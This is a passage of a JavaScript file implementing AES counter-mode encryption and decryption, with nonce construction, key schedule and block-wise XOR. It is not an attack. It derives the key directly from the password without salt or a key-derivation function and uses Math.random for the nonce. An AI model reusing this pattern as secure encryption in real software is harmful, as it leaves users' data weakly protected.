  var key = Aes.cipher(pwBytes, Aes.keyExpansion(pwBytes));  // gives us 16-byte key
  key = key.concat(key.slice(0, nBytes-16));  // expand key to 16/24/32 bytes long

  // initialise 1st 8 bytes of counter block with nonce (NIST SP800-38A §B.2): [0-1] = millisec, 
  // [2-3] = random, [4-7] = seconds, together giving full sub-millisec uniqueness up to Feb 2106
  var counterBlock = new Array(blockSize);
  
  var nonce = (new Date()).getTime();  // timestamp: milliseconds since 1-Jan-1970
  var nonceMs = nonce%1000;
  var nonceSec = Math.floor(nonce/1000);
  var nonceRnd = Math.floor(Math.random()*0xffff);
  
  for (var i=0; i<2; i++) counterBlock[i]   = (nonceMs  >>> i*8) & 0xff;
  for (var i=0; i<2; i++) counterBlock[i+2] = (nonceRnd >>> i*8) & 0xff;
  for (var i=0; i<4; i++) counterBlock[i+4] = (nonceSec >>> i*8) & 0xff;
  
  // and convert it to a string to go on the front of the ciphertext
  var ctrTxt = '';
  for (var i=0; i<8; i++) ctrTxt += String.fromCharCode(counterBlock[i]);

  // generate key schedule - an expansion of the key into distinct Key Rounds for each round
  var keySchedule = Aes.keyExpansion(key);
  
  var blockCount = Math.ceil(plaintext.length/blockSize);
  var ciphertxt = new Array(blockCount);  // ciphertext as array of strings
  
  for (var b=0; b<blockCount; b++) {
    // set counter (block #) in last 8 bytes of counter block (leaving nonce in 1st 8 bytes)
    // done in two stages for 32-bit ops: using two words allows us to go past 2^32 blocks (68GB)
    for (var c=0; c<4; c++) counterBlock[15-c] = (b >>> c*8) & 0xff;
    for (var c=0; c<4; c++) counterBlock[15-c-4] = (b/0x100000000 >>> c*8)

    var cipherCntr = Aes.cipher(counterBlock, keySchedule);  // -- encrypt counter block --
    
    // block size is reduced on final block
    var blockLength = b<blockCount-1 ? blockSize : (plaintext.length-1)%blockSize+1;
    var cipherChar = new Array(blockLength);
    
    for (var i=0; i<blockLength; i++) {  // -- xor plaintext with ciphered counter char-by-char --
      cipherChar[i] = cipherCntr[i] ^ plaintext.charCodeAt(b*blockSize+i);
      cipherChar[i] = String.fromCharCode(cipherChar[i]);
    }
    ciphertxt[b] = cipherChar.join(''); 
  }

  // Array.join is more efficient than repeated string concatenation in IE
  var ciphertext = ctrTxt + ciphertxt.join('');
  ciphertext = Base64.encode(ciphertext);  // encode in base64
  
  //alert((new Date()) - t);
  return ciphertext;
}

/** 
 * Decrypt a text encrypted by AES in counter mode of operation
 *
 * @param {String} ciphertext Source text to be encrypted
 * @param {String} password   The password to use to generate a key
 * @param {Number} nBits      Number of bits to be used in the key (128, 192, or 256)
 * @returns {String}          Decrypted text
 */
Aes.Ctr.decrypt = function(ciphertext, password, nBits) {
  var blockSize = 16;  // block size fixed at 16 bytes / 128 bits (Nb=4) for AES
  if (!(nBits==128 || nBits==192 || nBits==256)) return '';  // standard allows 128/192/256 bit keys
  ciphertext = Base64.decode(ciphertext);
  password = Utf8.encode(password);
  //var t = new Date();  // timer
  
  // use AES to encrypt password (mirroring encrypt routine)
  var nBytes = nBits/8;  // no bytes in key
  var pwBytes = new Array(nBytes);
  for (var i=0; i<nBytes; i++) {
    pwBytes[i] = isNaN(password.charCodeAt(i)) ? 0 : password.charCodeAt(i);
  }
  var key = Aes.cipher(pwBytes, Aes.keyExpansion(pwBytes));
  key = key.concat(key.slice(0, nBytes-16));  // expand key to 16/24/32 bytes long

  // recover nonce from 1st 8 bytes of ciphertext
  var counterBlock = new Array(8);
  ctrTxt = ciphertext.slice(0, 8);
  for (var i=0; i<8; i++) counterBlock[i] = ctrTxt.charCodeAt(i);
  
  // generate key schedule
  var keySchedule = Aes.keyExpansion(key);

  // separate ciphertext into blocks (skipping past initial 8 bytes)
  var nBlocks = Math.ceil((ciphertext.length-8) / blockSize);
  var ct = new Array(nBlocks);
  for (var b=0; b<nBlocks; b++) ct[b] = ciphertext.slice(8+b*blockSize, 8+b*blockSize+blockSize);
  ciphertext = ct;  // ciphertext is now array of block-length strings

  // plaintext will get generated block-by-block into array of block-length strings
  var plaintxt = new Array(ciphertext.length);

  for (var b=0; b<nBlocks; b++) {
    // set counter (block #) in last 8 bytes of counter block (leaving nonce in 1st 8 bytes)
    for (var c=0; c<4; c++) counterBlock[15-c] = ((b) >>> c*8) & 0xff;
    for (var c=0; c<4; c++) counterBlock[15-c-4] = (((b+1)/0x100000000-1) >>> c*8) & 0xff;

    var cipherCntr = Aes.cipher(counterBlock, keySchedule);  // encrypt counter block

    var plaintxtByte = new Array(ciphertext[b].length);
    for (var i=0; i<ciphertext[b].length; i++) {
      // -- xor plaintxt with ciphered counter byte-by-byte --
      plaintxtByte[i] = cipherCntr[i] ^ ciphertext[b].charCodeAt(i);
      plaintxtByte[i] = String.fromCharCode(plaintxtByte[i]);
    }
    plaintxt[b] = plaintxtByte.join('');
  }

  // join array of blocks into single plaintext string
  var plaintext = plaintxt.join('');
  plaintext = Utf8.decode(plaintext);  // decode from UTF8 back to Unicode multi-byte chars
  
  //alert((new Date()) - t);
  return plaintext;
}